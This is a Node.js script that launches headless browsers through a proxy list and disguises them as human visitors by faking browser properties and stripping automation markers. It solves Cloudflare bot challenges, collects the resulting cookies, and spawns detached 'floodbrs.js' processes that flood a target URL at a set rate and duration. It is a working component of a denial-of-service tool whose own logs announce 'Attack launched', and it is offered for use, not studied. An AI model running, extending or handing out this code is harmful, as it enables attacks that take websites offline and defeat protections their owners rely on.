const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== CLOUDFLARE BYPASS ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096'
];

// SIMPLE CLOUDFLARE SOLVER - UNTUK SEMUA JENIS CHALLENGE
const solveCloudflareChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Solving Cloudflare: ${maskProxy(browserProxy)}`);
        
        // Tunggu halaman load
        await sleep(8);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        
        // Cek jika sudah passed
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Already passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'already_passed' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Challenge detected: ${title}`);
        
        // METHOD 1: Click semua button yang visible
        coloredLog(COLORS.WHITE, `[SOLVER] Clicking all visible buttons`);
        
        const buttons = await page.$$('button, input[type="submit"], input[type="button"]').catch(() => []);
        
        for (const button of buttons) {
            try {
                const isVisible = await button.evaluate(el => {
                    const rect = el.getBoundingClientRect();
                    return rect.width > 0 && rect.height > 0;
                }).catch(() => false);
                
                if (isVisible) {
                    await button.click().catch(() => {});
                    coloredLog(COLORS.YELLOW, `[SOLVER] Clicked button`);
                    await sleep(10);
                    
                    // Cek jika solved
                    currentUrl = page.url();
                    title = await page.title().catch(() => '');
                    
                    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                        coloredLog(COLORS.GREEN, `[SOLVER] Challenge solved!`);
                        return { solved: true, scenario: 'button_click' };
                    }
                }
            } catch (e) {}
        }
        
        // METHOD 2: Tunggu auto-solve
        coloredLog(COLORS.WHITE, `[SOLVER] Waiting for auto-solve (20s)`);
        await sleep(20);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Auto-solve successful`);
            return { solved: true, scenario: 'auto_solve' };
        }
        
        // METHOD 3: Reload dan coba lagi
        coloredLog(COLORS.WHITE, `[SOLVER] Reloading page`);
        await page.reload().catch(() => {});
        await sleep(15);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Reload successful`);
            return { solved: true, scenario: 'reload_success' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] Failed to solve challenge`);
        return { solved: false, scenario: 'failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] Error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// SIMPLE COOKIES EXTRACTOR
const extractCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[COOKIES] Extracting cookies: ${maskProxy(browserProxy)}`);
        
        await sleep(5);
        
        // Ambil cookies dari semua domain
        const cookies = await page.cookies().catch(() => []);
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[COOKIES] Found ${cookies.length} cookies`);
            return { 
                success: true, 
                cookies: cookieString, 
                hasCookies: true
            };
        } else {
            coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found`);
            return { 
                success: true, 
                cookies: '', 
                hasCookies: false
            };
        }
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] Error: ${error.message}`);
        return { 
            success: false, 
            cookies: '', 
            hasCookies: false
        };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        }
    });

    setTimeout(() => {
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15`
];

// SIMPLE BROWSER LAUNCHER
const launchCloudflareBrowser = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: true
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[BROWSER] Starting: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply bypass
        await bypassFirewall(page);

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 45000 
        }).catch(() => {});

        // Solve Cloudflare challenge
        const challengeResult = await solveCloudflareChallenge(page, browserProxy, targetURL);
        
        if (!challengeResult.solved) {
            throw new Error('Challenge not solved');
        }

        coloredLog(COLORS.GREEN, `[SUCCESS] Challenge solved via ${challengeResult.scenario}`);

        // Extract cookies
        const cookieResult = await extractCookies(page, targetURL, browserProxy);
        
        if (!cookieResult.success || !cookieResult.hasCookies) {
            coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found, but continuing attack`);
        } else {
            coloredLog(COLORS.GREEN, `[COOKIES] Got cookies`);
        }
        
        totalSolves++;

        await browser.close();
        return { 
            cookies: cookieResult.cookies || '', 
            userAgent,
            scenario: challengeResult.scenario,
            hasCookies: cookieResult.hasCookies
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying... (${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
            await sleep(3);
            return launchCloudflareBrowser(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[FAILED] All attempts failed: ${maskProxy(browserProxy)}`);
        return null;
    }
};

// FLOOD PROCESS LAUNCHER
const launchFloodProcess = async (cookies, userAgent, browserProxy) => {
    try {
        coloredLog(COLORS.YELLOW, `[FLOOD] Launching: ${maskProxy(browserProxy)}`);
        
        const floodProcess = spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1',
            proxyFile,
            cookies || '',
            userAgent || randomElement(userAgents),
            validKey
        ], {
            detached: true,
            stdio: 'ignore'
        });

        floodProcess.unref();
        return true;
        
    } catch (error) {
        coloredLog(COLORS.RED, `[FLOOD] Launch error: ${error.message}`);
        return false;
    }
};

// THREAD HANDLER
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        coloredLog(COLORS.RED, `[THREAD] Max retries: ${maskProxy(browserProxy)}`);
        done(null, { task });
        return;
    }

    try {
        const cloudflareData = await launchCloudflareBrowser(targetURL, browserProxy);
        
        if (cloudflareData) {
            const floodLaunched = await launchFloodProcess(
                cloudflareData.cookies, 
                cloudflareData.userAgent, 
                browserProxy
            );
            
            if (floodLaunched) {
                coloredLog(COLORS.GREEN, `[SUCCESS] Attack launched: ${maskProxy(browserProxy)}`);
            }
        }
        
        done(null, { task });
        
    } catch (error) {
        coloredLog(COLORS.RED, `[THREAD] Attempt failed: ${error.message}`);
        await sleep(5);
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// QUEUE SETUP
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, 1);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[COMPLETE] All proxies processed');
});

// MAIN EXECUTION
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] Cloudflare solver with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[CLEANUP] Time completed');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[SHUTDOWN] Mission complete');
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[CRASH] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[REJECTION] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[READY] 🛡️ CLOUDFLARE SOLVER ACTIVATED 🛡️');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
